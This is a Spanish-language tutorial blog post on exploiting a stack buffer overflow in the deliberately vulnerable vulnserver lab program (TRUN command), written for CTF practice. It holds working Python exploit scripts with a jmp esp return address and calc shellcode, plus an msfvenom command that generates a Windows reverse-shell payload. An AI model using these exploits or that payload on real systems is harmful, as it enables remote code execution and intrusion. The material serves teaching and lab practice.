---
title: " Que es un buffer overflow (vulnserver) (CFT)"
date: 2025-06-07T10:30:00-06:00
draft: false
tags: ["c++","bufferoverflow"]
---

En esta entrada mostrare lo que es un buffer overflow, esta es una falla muy conocida y al mismo tiempo peligrosa en los CFT es común ver este tipo de retos por lo que mostrare como se puede realizar uno básico, para este tipo de vulnerabilidades es necesario tener un poco de conocimiento de cómo se maneja la memoria y asm.


Los dos programas que se van a ocupar son:

- x64dbg
- IDA 
- [https://github.com/stephenbradshaw/vulnserver](https://github.com/stephenbradshaw/vulnserver)

### Que es un bufferoverflow?

bufferoverflow se produce cuando se colocan más datos en un búfer de longitud fija de los que el búfer puede manejar. 
en este caso en la función buffer tiene una variable de tamaño 5 y nuestra cadena tiene una longitud mayora a eso por lo que los datos restantes van a sobre escribir el stack


```c

#include <string.h>
 
void buffer(char* input) {
    char buffer[5];
    strcpy(buffer, input);
}
 
int main(int argc, char** argv) {
	char* Vulnerable="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
	buffer(Vulnerable);
}
````
 
![enter image description here](https://i.imgur.com/d7syZFV.png)

si compilamos y depuramos vemos que el EIP (puntero de instrucción) no tiene una dirección si no puras "aaaa" en hax

### Encontrar la funcion vulnerable 

para explotar el buffer overflow en vulnserver sin protecciones es bastante fácil

en este caso remiendo hacer un análisis estático del programa esto es más fácil si se hace desde IDA, el modo grafico nos va a ser de gran ayuda en estos casos para darle seguiento a las funciones 

esta es la función de bienvenida por lo que hay que continuar para ver si hay algún comando vulnerable

![enter image description here](https://i.imgur.com/6pw7YUX.png)

en este caso la funcion3 es candidata para ser explotada y es llamada por varios comandos, pero más especialmente por TRUN ya es la más fácil 

```x86asm
.text:00401808                 push    ebp
.text:00401809                 mov     ebp, esp
.text:0040180B                 sub     esp, 7E8h
.text:00401811                 mov     eax, [ebp+arg_0]
.text:00401814                 mov     [esp+7E8h+Source], eax ; Source
.text:00401818                 lea     eax, [ebp+var_7D8]
.text:0040181E                 mov     [esp+7E8h+Destination], eax ; Destination
.text:00401821                 call    _strcpy
.text:00401826                 leave
.text:00401827                 retn
.text:00401827 _Function3      endp
```

esta funcion es vulnerable ya que _strcpy no tiene ninguna "proteccion" 

______________________________________

 `strcpy`

Copia la cadena C señalada por la fuente en la matriz señalada por el destino , incluido el carácter nulo de terminación (y deteniéndose en ese punto).

______________________________________
En este caso para probar si es vulnerable vamos intentar enviar cadena de más de 2020 caracteres  

```python
#!/usr/bin/python

import socket	
import sys	

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error:
	sys.exit()
host = '192.168.1.115';
port = 9999;
try:
	remote_ip = socket.gethostbyname( host )
except socket.gaierror:
	sys.exit()
s.connect((remote_ip , port))
command="TRUN _."
message = "a"*2500
exploit=command+message

try :
    s.send(exploit.encode())
except socket.error:
	sys.exit()

reply = s.recv(4096)
print (reply)
```

Lo que buscamos es que se sobrescriba el ESP y después el EIP y como era de esperarse si se sobre escribió el EIP contiene 616161 

![enter image description here](https://i.imgur.com/TkhMSIZ.png)

### Explotacion (cantidad de bytes necesarios)

vamos a contar la cantidad bytes que se necesitan para llegar a esp y no sobrescribirlo en este caso recomiendo poner números aleatorios   


![](https://i.imgur.com/4kBsKSF.png)

lo vamos a ejecutar para obtener la cantidad de bytes necesarios para sobrescribir el EIP 
 
![](https://i.imgur.com/4kIbqVz.png)

invertimos el orden (Endianness) 

30 54 68 37 == 37 68 54 30 == 7hT0

![](https://i.imgur.com/3HGhosz.png)

buscamos en el texto y obtenemos que se ocupan 2005 bytes para evitar sobrescribir el EIP 

### Explotacion (jmp esp)

vamos a buscar alguna instrucción que nos pueda ayudar a ejecutar el contenido en ESP como por ejemplo jmp esp

search in --> all modules --> find command 

buscamos  jmp esp 

![](https://i.imgur.com/AfCAzDz.png)

Address=625011AF
Disassembly=jmp esp

esto lo mandamos a EIP lo invetimos (Endianness)

por lo que nuestro código queda de la siguiente forma 

```python

#!/usr/bin/python

import socket	
import sys	

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error:
	sys.exit()
host = '192.168.1.115';
port = 9999;
try:
	remote_ip = socket.gethostbyname( host )
except socket.gaierror:
	sys.exit()
s.connect((remote_ip , port))
command="TRUN _."
message = "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"
epi="\x62\x50\x11\xAF"
exploit=command+message+epi

try :
    s.send(exploit.encode())
except socket.error:
	sys.exit()
reply = s.recv(4096)
print (reply)
``` 

### Explotacion (Shellcode calc) y Bad Characters

pueden usar exploitdb para buscar una shellcode calc o usar msfvenom en mi caso voy a usar exploitdb, una cosa que hay que tener en cuenta son los "Bad Characters" como mencione la función strcpy busca bytes nulos para terminar por lo que si nuestra sellcode tiene algun \x00 no va a completar la shellcode y no va a funcionar uno de los métodos mas usados en msvenom es -b `msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.109 LPORT=4444  -f c     -b '\x00'` donde estoy borrando bytes nulos.

[https://www.exploit-db.com/exploits/48116](https://www.exploit-db.com/exploits/48116)


```python

import sys	

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error:
	sys.exit()
host = '192.168.1.115';
port = 9999;
try:
	remote_ip = socket.gethostbyname( host )
except socket.gaierror:
	sys.exit()
s.connect((remote_ip , port))
command=b"TRUN _."
message = b"\x90"*2005
nops = b"\x90"*10
shellcode=b"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0"
epi=b"\xAF\x11\x50\x62"
exploit=command+message+epi+nops+shellcode

try :
    s.send(exploit)
except socket.error:
	sys.exit()
reply = s.recv(4096)
print (reply)

```

![](https://i.imgur.com/63BReCz.png)